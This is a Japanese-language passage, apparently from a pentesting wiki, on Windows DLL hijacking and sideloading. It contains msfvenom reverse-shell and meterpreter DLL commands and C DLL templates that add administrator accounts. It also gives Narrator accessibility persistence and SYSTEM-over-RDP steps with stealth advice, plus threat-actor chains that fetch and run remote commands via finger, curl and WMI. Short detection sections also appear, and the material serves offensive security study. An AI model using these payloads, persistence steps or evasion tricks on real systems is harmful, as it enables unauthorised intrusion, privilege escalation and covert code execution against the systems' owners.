悪用可能なシナリオを見つけた場合、悪用を成功させるために最も重要なことの1つは、**実行ファイルがそのDLLからインポートするすべての関数をエクスポートするDLLを作成すること**です。なお、DLL Hijackingは、[Medium Integrity levelからHigh **(UACのバイパス)**](../../authentication-credentials-uac-and-efs/index.html#uac)への権限昇格や、[**High IntegrityからSYSTEM**](../index.html#from-high-integrity-to-system)**への権限昇格**に便利です。DLL hijackingによる実行に焦点を当てたこちらの資料に、**有効なDLLの作成方法**の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレート**として、または**不要な関数をエクスポートするDLL**の作成に役立つ**基本的なDLLコード**を紹介します。

## **DLLの作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy**とは、**読み込まれたときに悪意のあるコードを実行できる**だけでなく、すべての呼び出しを実際のライブラリに中継することで、期待どおりに**公開**され、**動作する**DLLです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使うと、実行ファイルを指定してproxy化するライブラリを選択し、**proxy化されたDLLを生成**できます。または、DLLを指定して**proxy化されたDLLを生成**できます。

### **Meterpreter**

**rev shellを取得 (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86)を取得する:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**ユーザーを作成する（x86版。x64版は見つからなかった）:**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自作

多くの場合、コンパイルするDLLは**被害プロセスがインポートするすべての関数をエクスポートする必要があります**。必要なエクスポートが欠けていると、バイナリが関数を解決できず、exploitは失敗します。

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>ユーザー作成を行うC++ DLLの例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>スレッドエントリを持つ別のC DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### export による初期化をトリガーする NativeAOT DLL

自己完結型の **.NET NativeAOT shared library** は、明示的な `DllMain` を実装せずに、配置する native DLL として使用できます。[UnmanagedCallersOnly(EntryPoint = "...")]` を使って静的 C# メソッドをエクスポートすると、native host がコンパイラー生成のエントリーポイントのいずれかを呼び出した際に、NativeAOT がモジュールを初期化し、エクスポートされた C# 本体の実行前に `[ModuleInitializer]` メソッドが実行されます。出力の実行に、別途インストールされた .NET runtime は必要ありません。<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL には、選択した host が実際に呼び出す **export 名と ABI 互換のシグネチャ** が引き続き必要です。初期化をトリガーするには最小限のスタブで十分な場合もありますが、export が不足しているとロードに失敗することがあり、シグネチャが正しくないと呼び出し時にデータが破損する可能性があります。host の import を列挙し、出力の名前を host が想定する依存関係名に変更する前に、`dumpbin /exports payload.dll` で結果を検証してください。<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>最小限の NativeAOT エクスポート DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

プロジェクトを自己完結型の Windows ネイティブ共有ライブラリとして構成します:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

名前を変更した DLL を、コピーした脆弱な実行ファイルの隣に配置し、互換性のある export を呼び出すコードパスを通じてホストを起動します。この initializer アプローチでは、複雑な処理を `DllMain` に直接記述せずに済みますが、sideload の前提条件は変わりません。ローダーが依存関係を名前で解決し、アプリケーションディレクトリを選択すること、また KnownDLLs、すでにロード済みのモジュール、SxS リダイレクト、制限付きの `LOAD_LIBRARY_SEARCH_*` フラグによって先に解決されないことが必要です。<sup>[[26]](#references)[[30]](#references)</sup>

従来型の native テンプレートについては、[Windows C payloads](../windows-c-payloads.md) を参照してください。sideload された第 1 段階では、その後 [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) を実行する場合がありますが、これは DLL 解決の一部ではなく、別個の injection technique です。

## 検出: DLL masquerading によるライブラリのロード

Elastic Defend 9.5.0 は、ロードされたファイルが Microsoft 署名ではなく、そのファイル名が Elastic の Windows/system DLL 名のキャッシュ済みインベントリと衝突する場合、ライブラリのロードイベントに `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` を付加します。これにより、ファイル名のインベントリ、システム上の場所、署名の分析がエンドポイントセンサーに移されるため、コア EQL は次のように簡略化できます。<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

この enrichment は、それ単体での証明ではなく、高価値なピボットとして扱ってください。署名済みの host が自身の**ユーザー書き込み可能な**ディレクトリから DLL を読み込み、その DLL が未署名または信頼されておらず、`dll.Ext.relative_file_creation_time` が読み込み直前に作成されたことを示す場合、確信度を高めます。除外範囲は、正確な publisher + host process + installation path に限定してください。正規の installer や application がシステム風の名前を持つ private library を配布している場合があるため、衝突する DLL 名をグローバルに抑制しないでください。<sup>[[26]](#references)</sup>

この enrichment がない sensor では、衝突する DLL 名を、非システムの load path、Microsoft 署名の欠如または信頼できない署名、短いファイル作成から読み込みまでの時間と相関させることで、この動作を近似できます。これには、DLL 名の inventory を維持し、`%SystemRoot%\\System32`、`SysWOW64`、`WinSxS`、その他の承認済み deployment path に対する限定的な除外を設定する必要があります。<sup>[[26]](#references)</sup>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (アクセシビリティ/AT)

Windows Narrator.exe は、起動時に予測可能な言語固有の localization DLL を引き続き検索します。この DLL は hijack して任意のコード実行や persistence に利用できます。<sup>[[7]](#references)</sup>

主な事実
- Probe path (現在の build): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- Legacy path (旧 build): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に書き込み可能な、攻撃者が制御する DLL が存在する場合、その DLL が読み込まれ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。export は不要です。

Procmon での検出
- Filter: `Process Name is Narrator.exe` と `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記 path の読み込みが試行されることを確認します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC の隠密性
- 素朴な hijack では UI が表示されたり強調表示されたりします。目立たないようにするには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）、`SuspendThread` で一時停止します。処理は自分のスレッドで続行します。全コードは PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility の設定による起動と永続化
- ユーザーコンテキスト（HKCU）: `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定を行うと、Narrator の起動時に仕込んだ DLL が読み込まれます。セキュアデスクトップ（ログオン画面）で CTRL+WIN+ENTER を押して Narrator を起動すると、セキュアデスクトップ上で DLL が SYSTEM として実行されます。

RDP 経由で起動する SYSTEM 実行（lateral movement）
- 従来の RDP セキュリティレイヤーを許可: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動します。セキュアデスクトップ上で DLL が SYSTEM として実行されます。
- RDP セッションが終了すると実行も停止するため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込み Accessibility Tool（AT）のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すように編集してインポートした後、`configuration` にその AT 名を設定できます。これにより、Accessibility フレームワーク経由で任意の実行を仲介できます。

注意事項
- `%windir%\System32` への書き込みと HKLM 値の変更には admin 権限が必要です。
- payload のロジックはすべて `DLL_PROCESS_ATTACH` に配置できます。exports は不要です。

## ケーススタディ: CVE-2025-1729 - TPQMAssistant.exe を使った Privilege Escalation

この事例では、Lenovo の TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を取り上げます。この脆弱性は **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### 脆弱性の詳細

- **コンポーネント**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中のユーザーのコンテキストで毎日午前 9:30 に実行されます。
- **ディレクトリのアクセス許可**: `CREATOR OWNER` に書き込みが許可されているため、ローカルユーザーが任意のファイルを配置できます。
- **DLL の検索動作**: 最初に作業ディレクトリから `hostfxr.dll` の読み込みを試み、見つからない場合は "NAME NOT FOUND" と記録します。これはローカルディレクトリが優先して検索されることを示しています。

### Exploit の実装

攻撃者は同じディレクトリに悪意のある `hostfxr.dll` のスタブを配置し、欠落している DLL を悪用してユーザーのコンテキストでコード実行できます。

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻撃の流れ

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前 9:30 に実行されるのを待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性レベルで管理者のセッション内で実行されます。
4. 標準的な UAC bypass 技術を連鎖させ、中程度の整合性レベルから SYSTEM 権限へ昇格します。

## ケーススタディ: MSI CustomAction Dropper + 署名済み Host を介した DLL side-loading (wsc_proxy.exe)

脅威アクターは、信頼された署名済みプロセスのもとでペイロードを実行するために、MSI ベースの Dropper と DLL side-loading を頻繁に組み合わせます。<sup>[[10]](#references)</sup>

連鎖の概要
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction がサイレントに実行され（例: LaunchApplication または VBScript アクション）、埋め込みリソースから次のステージを再構築します。
- Dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（例: Avast 署名済みの wsc_proxy.exe と攻撃者が制御する wsc.dll の組み合わせ）。
- 署名済み EXE が起動すると、Windows の DLL 検索順序により、作業ディレクトリの wsc.dll が最初に読み込まれ、署名済みの親プロセスのもとで攻撃者のコードが実行されます（ATT&CK T1574.001）。

MSI の分析（確認する点）
- CustomAction テーブル:
  - 実行ファイルまたは VBScript を実行するエントリを探します。疑わしいパターンの例: LaunchApplication がバックグラウンドで埋め込みファイルを実行する。
  - Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを確認します。
- MSI CAB 内の埋め込み/分割ペイロード:
  - 管理者として展開: msiexec /a package.msi /qb TARGETDIR=C:\out
  - または lessmsi を使用: lessmsi x package.msi C:\out
  - VBScript CustomAction によって連結・復号される複数の小さな断片を探します。一般的な流れ:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- 次の2つのファイルを同じフォルダーに配置します:
  - wsc_proxy.exe: 正規の署名済みホスト (Avast)。このプロセスは、実行ファイルのあるディレクトリから名前で wsc.dll を読み込もうとします。
  - wsc.dll: 攻撃者の DLL。特定のエクスポートが必要ない場合は、DllMain だけで十分です。必要な場合は、proxy DLL を作成して必要なエクスポートを本物のライブラリに転送しながら、DllMain で payload を実行します。
- 最小限の DLL payload をビルドします:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export要件には、payloadも実行するforwarding DLLを生成するproxying framework（例：DLLirant/Spartacus）を使用します。

- この手法は、ホストバイナリによるDLL名解決に依存します。ホストが絶対パスや安全な読み込みフラグ（例：LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackに失敗することがあります。
- KnownDLLs、SxS、forwarded exportsは優先順位に影響するため、ホストバイナリとexport setの選定時に考慮する必要があります。

## 署名済みtriad + 暗号化payload（ShadowPadのケーススタディ）

Check Pointは、Ink Dragonが**3ファイルのtriad**を使ってShadowPadを展開し、正規ソフトウェアに紛れ込ませながら、コアpayloadをディスク上で暗号化したままにする手法を解説しました:<sup>[[12]](#references)</sup>

1. **署名済みホスト EXE** – AMD、Realtek、NVIDIAなどのベンダー製ソフトウェアが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者はWindowsバイナリに見えるよう実行ファイルの名前を変更します（例：`conhost.exe`）。ただし、Authenticode署名は有効なままです。
2. **悪意あるloader DLL** – EXEと同じ場所に、想定される名前で配置されます（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。通常、このDLLはScatterBrain frameworkで難読化されたMFCバイナリです。役割は暗号化blobの場所を特定して復号し、ShadowPadをreflectively mapすることだけです。
3. **暗号化payload blob** – 多くの場合、同じディレクトリに`<name>.tmp`として保存されます。復号したpayloadをメモリにmapした後、loaderはTMPファイルを削除してフォレンジックの証拠を消去します。

Tradecraftに関する注意事項:

* PEヘッダーの元の`OriginalFileName`を維持したまま署名済みEXEの名前を変更すると、ベンダー署名を保ちながらWindowsバイナリを装えます。そのため、Ink Dragonの手口にならい、AMD/NVIDIAのユーティリティを偽装した`conhost.exe`風のバイナリを配置します。
* 実行ファイルは信頼されたままなので、ほとんどのallowlisting制御では、悪意あるDLLをその隣に置くだけで済みます。loader DLLのカスタマイズに注力してください。通常、署名済みの親プロセスには手を加えずに実行できます。
* ShadowPadのdecryptorは、TMP blobがloaderの隣にあり、mapping後にファイルをゼロ化できるよう書き込み可能であることを想定しています。payloadの読み込みが完了するまではディレクトリを書き込み可能にしておきます。メモリ上に読み込まれれば、OPSECのためTMPファイルを安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（Finger → tar/curl → WMI）

攻撃者はDLL sideloadingとLOLBASを組み合わせ、ディスク上に置く独自のartifactを、信頼されたEXEの隣にある悪意あるDLLだけにします:<sup>[[1]](#references)</sup>

- **リモートコマンドloader（Finger）:** Hidden PowerShellが`cmd.exe /c`を起動し、Fingerサーバーからコマンドを取得して`cmd`にパイプします:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` は TCP/79 からテキストを取得します。`| cmd` でサーバーの応答を実行できるため、オペレーターはサーバー側で second stage を切り替えられます。

- **組み込みのダウンロード／展開:** 無害な拡張子のアーカイブをダウンロードして展開し、ランダムな `%LocalAppData%` フォルダーに sideload target と DLL を配置します。

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` は進捗を非表示にしてリダイレクトを追跡します。`tar -xf` は Windows 組み込みの tar を使用します。

- **WMI/CIM launch:** WMI 経由で EXE を起動します。これにより、同じディレクトリにある DLL の読み込み時に、テレメトリ上では CIM によって作成されたプロセスとして記録されます。

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - ローカル DLL を優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で機能し、payload（例: Remcos）は信頼された名前で実行されます。

- **調査:** `/p`、`/m`、`/c` が同時に指定された `forfiles` にアラートを設定します。管理者用スクリプト以外ではあまり見られません。


## ケーススタディ: NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

最近の Lotus Blossom の侵入では、信頼された更新チェーンを悪用して、DLL sideload と完全なインメモリ payload を仕込む NSIS パック済み dropper が配信されました。<sup>[[13]](#references)</sup>

攻撃の流れ
- `update.exe`（NSIS）は `%AppData%\Bluetooth` を作成して **HIDDEN** に設定し、名前を変更した Bitdefender Submission Wizard の `BluetoothService.exe`、悪意のある `log.dll`、暗号化された blob `BluetoothService` を配置してから EXE を起動します。
- ホスト EXE は `log.dll` をインポートし、`LogInit`/`LogWrite` を呼び出します。`LogInit` は blob を mmap で読み込みます。`LogWrite` はカスタム LCG ベースのストリーム（定数 **0x19660D** / **0x3C6EF35F**、以前の hash から導出した鍵素材）で復号し、バッファを平文の shellcode で上書きして一時データを解放し、shellcode にジャンプします。
- IAT を回避するため、ローダーは **FNV-1a basis 0x811C9DC5 + prime 0x1000193** を使って export 名を hash 化し、Murmur 形式の avalanche（**0x85EBCA6B**）を適用して、salt 付きの対象 hash と比較します。

メインの shellcode（Chrysalis）
- 5回のパスで、鍵 `gQ2JR&9;` を使った add/XOR/sub を繰り返して PE 形式のメインモジュールを復号し、その後 `Kernel32.dll` → `GetProcAddress` を動的に読み込んで import 解決を完了します。
- 文字ごとの bit-rotate/XOR 変換を使って実行時に DLL 名文字列を再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を読み込みます。
- 2つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を4バイト単位で解析して Murmur 形式の混合処理を行い、hash が見つからない場合に限り `GetProcAddress` にフォールバックします。

埋め込み設定と C2
- 設定は配置された `BluetoothService` ファイル内の **offset 0x30808**（サイズ **0x980**）にあり、キー `qwhvb^435h&*7` で RC4 復号すると、C2 URL と User-Agent が判明します。
- beacon はドット区切りのホストプロファイルを作成し、タグ `4Q` を先頭に付けてから、キー `vAuig34%^325hGV` で RC4 暗号化し、HTTPS 経由で `HttpSendRequestA` に送ります。応答は RC4 復号され、タグの switch（`4T` shell、`4V` プロセス実行、`4W/4X` ファイル書き込み、`4Y` 読み取り/exfil、`4\\` アンインストール、`4` ドライブ/ファイル列挙 + チャンク転送ケース）によって処理されます。
- 実行モードは CLI 引数で制御されます。引数なしの場合は `-i` を指す persistence（service/Run key）をインストールし、`-i` は `-k` を付けて自身を再起動します。`-k` はインストールをスキップして payload を実行します。

確認された別のローダー
- 同じ侵入では Tiny C Compiler も配置し、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を実行していました。`libtcc.dll` はその隣に配置されていました。攻撃者が用意した C ソースには shellcode が埋め込まれており、コンパイル後、PE をディスクに書き込まずにインメモリで実行されました。次のように再現できます。

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- この TCC ベースのコンパイル・実行段階では、実行時に `Wininet.dll` をインポートし、ハードコードされた URL から第 2 段階の shellcode を取得していたため、コンパイラーの実行を装う柔軟な loader となっていました。

## エクスポートのプロキシとホストスレッドの待機を組み合わせた署名済みホストのサイドローディング

一部の DLL サイドローディングのチェーンでは、悪意のある DLL の読み込み後に正規のホストがクラッシュするのを防ぎ、後続段階を正常に読み込めるだけの時間、ホストを稼働させるために、**安定性を高める工夫**が加えられています。<sup>[[11]](#references)</sup>

観測されたパターン
- 信頼された EXE を、`version.dll` のような想定される依存関係名を持つ悪意のある DLL と同じ場所に配置する。
- 悪意のある DLL は、想定されるすべてのエクスポートを実際のシステム DLL（例: `%SystemRoot%\\System32\\version.dll`）に**プロキシ**する。これにより、インポート解決が成功し、ホストプロセスは動作を続ける。
- 読み込み後、悪意のある DLL はホストのエントリポイントにパッチを適用し、メインスレッドが終了したりプロセスを終了させるコードパスを実行したりせず、無限の `Sleep` ループに入るようにする。
- 新しいスレッドが実際の悪意ある処理を行う。次の段階の DLL 名またはパスを復号（RC4/XOR が一般的）し、`LoadLibrary` で起動する。

重要な理由
- 通常の DLL プロキシは API 互換性を維持しますが、後続段階に十分な時間、ホストが稼働し続けることまでは保証しません。
- メインスレッドを `Sleep(INFINITE)` で待機させると、loader がワーカースレッドで復号、ステージング、またはネットワーク経由のブートストラップを行う間、署名済みプロセスを簡単に常駐させられます。
- 不審な `DllMain` だけを探していると、ホストのエントリポイントへのパッチ適用後に興味深い動作が起き、二次スレッドが開始するこのパターンを見逃す可能性があります。

最小限の手順
1. 署名済みホスト EXE をコピーし、ローカルディレクトリから読み込む DLL を特定する。
2. 同じ関数をエクスポートし、正規の DLL に転送するプロキシ DLL を作成する。
3. `DllMain(DLL_PROCESS_ATTACH)` でワーカースレッドを作成する。
4. そのスレッドからホストのエントリポイントまたはメインスレッドの開始ルーチンにパッチを適用し、`Sleep` ループに入るようにする。
5. 次の段階の DLL 名/config を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

防御側の調査ポイント
- `version.dll` などの一般的なライブラリを、`System32` ではなくアプリケーションディレクトリから読み込む署名済みプロセス。
- イメージ読み込み直後にプロセスのエントリポイントへ加えられたメモリパッチ。特に、`Sleep`/`SleepEx` へリダイレクトするジャンプや呼び出し。
- プロキシ DLL が作成し、復号された名前を持つ 2 つ目の DLL に対して直ちに `LoadLibrary` を呼び出すスレッド。
- `ProgramData`、`%TEMP%`、展開済みアーカイブのパスなど、書き込み可能なステージングディレクトリ内で、ベンダーの実行ファイルと同じ場所に配置された、全エクスポートをプロキシする DLL。

## References

- [1] [Red Canary – インテリジェンス分析: 2026年1月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows での DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore がヨーロッパを標的とする新たなマルウェアを展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack と Windows ヘルパーの遭遇](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – デジタルなドッペルゲンガー: Gh0st RAT を配布する、進化するなりすましキャンペーンの分析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利害の合流: 東南アジア政府を標的とする脅威クラスターの分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon の内部: ステルス性の高い攻撃作戦におけるリレーネットワークと内部動作の解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom のツールキットを深掘り](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack チェーン](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – イランの APT Screening Serpens による 2026 年のスパイ活動を追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: イラン紛争中の Nimbus Manticore の作戦](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が東南アジアの政府機関と重要インフラを標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0 を使った Windows DLL 検索順序 hijacking の再構成と検出](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOT でネイティブライブラリをビルドする](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOT によるネイティブエクスポート](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – ダイナミックリンクライブラリの検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE 形式](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
